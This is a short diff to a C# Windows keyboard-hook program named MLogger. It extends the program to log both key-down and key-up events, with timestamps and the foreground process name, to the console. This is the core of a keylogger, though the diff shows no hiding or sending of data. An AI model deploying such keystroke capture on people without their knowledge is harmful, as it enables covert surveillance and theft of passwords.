@@ -13,6 +13,7 @@ namespace MLogger
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static Process procc;
@@ -47,7 +48,14 @@ namespace MLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode + " " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
+                Console.WriteLine((Keys)vkCode + " KEYDOWN " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
+                Console.WriteLine(ProcessLog.GetForegroundProcessName());
+            }
+
+            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Console.WriteLine((Keys)vkCode + " KEYUP " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
                 Console.WriteLine(ProcessLog.GetForegroundProcessName());
             }
 
